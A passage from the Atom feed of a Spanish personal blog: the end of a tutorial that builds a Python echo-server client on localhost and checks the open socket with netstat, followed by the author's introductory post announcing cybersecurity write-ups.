&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello world! This is an echo server made with python&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Fijate en la b que se encuentra detrás de la cadena de texto que queremos enviar. Esto es para indicar que es un “byte string”, que es el tipo de formato en el que debemos de enviar los datos, dado que la clase String internamente es un array de bytes. Otra forma de hacerlo sería guardando el string en una variable y codificarla mediante el método &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encode()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Luego, guardamos en la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; lo que nos envía el servidor (recuerda que el 1024 indica el tamaño del buffer).&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y ya por último, fuera del “with” imprimimos por pantalla los datos recibidos.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Data received by the server: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;repr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Fíjate en el método &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;repr()&lt;/code&gt;. Lo que hace es convertir lo que le pasemos por parámetro en algo representable por la terminal. Necesitamos usarlo ya que los datos se encuentran en “byte string”.&lt;/p&gt;

&lt;p&gt;CODIGO COMPLETO:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;SHOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# Localhost
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SPORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5346&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SPORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello world! This is an echo server made with python.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Received: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;repr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;ejecutando-el-echo-server&quot;&gt;Ejecutando el echo server&lt;/h2&gt;
&lt;p&gt;Para hacer funcionar el echo server, necesitamos ejecutar tanto el servidor como el cliente.&lt;/p&gt;

&lt;p&gt;Primero ejecutamos el servidor. Yo utilizo VSCode por lo que lo abro desde la terminal del propio IDE y lo ejecuto como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python .\server.py&lt;/code&gt; (o el nombre que le hayas dado al archivo de tu servidor):&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/que-es-un-socket-y-como-funciona/img2.png&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Como vemos, ya está ejecutándose&lt;/p&gt;

&lt;p&gt;Ahora, abrimos otra pestaña de la terminal (el botón al lado del “+” en la parte superior derecha de la terminal) y ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python .\client.py&lt;/code&gt; (o el nombre que le hayas dado al archivo de tu cliente):&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/que-es-un-socket-y-como-funciona/img3.png&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Y ahora el servidor muestra:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/que-es-un-socket-y-como-funciona/img4.png&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Como se puede ver, el resultado del cliente ha sido el esperado. El cliente se ha conectado desde la IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;, luego ha envíado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b&quot;Hello world! This is an echo server made with python&quot;&lt;/code&gt;, el servidor lo ha recibido y lo ha reenviado de nuevo al cliente. Después, el cliente lo ha mostrado por pantalla y ambos han finalizado su ejecución.&lt;/p&gt;

&lt;p&gt;Podemos ver el socket abierto &lt;strong&gt;si dejamos el servidor ejecutándose&lt;/strong&gt;. Para ello, abrimos la terminal (en este caso Windows) y ejecutamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netstat -an&lt;/code&gt;. Haciendo scroll hasta los sockets TCP, podemos ver el que hemos creado, que se encuentra en la IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; y en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5346&lt;/code&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/que-es-un-socket-y-como-funciona/img5.png&quot; width=&quot;80%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Una vez finalicemos la ejecución del servidor, el socket se cerrará y ya no lo podremos ver en la lista.&lt;/p&gt;</content><author><name>r4kso</name></author><category term="Explicaciones" /><category term="Artículos" /><category term="Redes" /><category term="Python" /><category term="Sockets" /><summary type="html">En este post te explico qué es un socket y cómo funciona, con un ejemplo práctico hecho en python (un echo server)</summary></entry><entry><title type="html">Proyecto personal 2021</title><link href="http://localhost:4000/proyecto-personal-blog/" rel="alternate" type="text/html" title="Proyecto personal 2021" /><published>2021-03-24T00:00:00+00:00</published><updated>2021-03-24T00:00:00+00:00</updated><id>http://localhost:4000/proyecto-personal-blog</id><content type="html" xml:base="http://localhost:4000/proyecto-personal-blog/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/proyecto-personal-blog/security.jpg&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Me presento como &lt;strong&gt;r4kso&lt;/strong&gt; (o Fran), estudiante de Ingeniería Informática en la Universitat Oberta de Catalunya (UOC). Hace un par de meses que descubrí el maravilloso mundo de la ciberseguridad, que me ha fascinado. Me he propuesto aprender más, y es por ello que he creado este blog.&lt;/p&gt;

&lt;p&gt;Tratar de romper una máquina está bastante bien y dependiendo de la dificultad y de tu nivel, puede ser todo un reto pero… Explicarlo incrementa su dificultad. Te obliga a profundizar en cada paso necesario y entenderlo al 100% para explicar correctamente los pasos dados y el objetivo de cada uno de ellos.&lt;/p&gt;

&lt;h2 id=&quot;contenidos&quot;&gt;Contenidos&lt;/h2&gt;
&lt;p&gt;Es por esto que publicaré diferentes &lt;strong&gt;posts explicativos&lt;/strong&gt; y &lt;strong&gt;write-ups de máquinas&lt;/strong&gt;, entre otras cosas relacionadas con la ciberseguridad.&lt;/p&gt;

&lt;p&gt;A pesar de que el tema principal será la ciberseguridad, esto no excluirá otros temas que quizás me apetece tocar en un futuro (como la programación o el desarrollo de software).&lt;/p&gt;

&lt;h2 id=&quot;objetivos&quot;&gt;Objetivos&lt;/h2&gt;
&lt;p&gt;El objetivo principal es muy simple: &lt;strong&gt;aprender&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Aprender mucho, tratar de exprimir al máximo cada máquina o cada tema y extraer todo el conocimiento posible&lt;/p&gt;

&lt;p&gt;Así que… &lt;strong&gt;manos a la obra&lt;/strong&gt; :)&lt;/p&gt;</content><author><name>r4kso</name></author><category term="Otros" /><category term="Otros" /><summary type="html">Me presento como r4kso (o Fran), estudiante de Ingeniería Informática en la Universitat Oberta de Catalunya (UOC). Hace un par de meses que descubrí el maravilloso mundo de la ciberseguridad, que me ha fascinado. Me he propuesto aprender más, y es por ello que he creado este blog.</summary></entry></feed>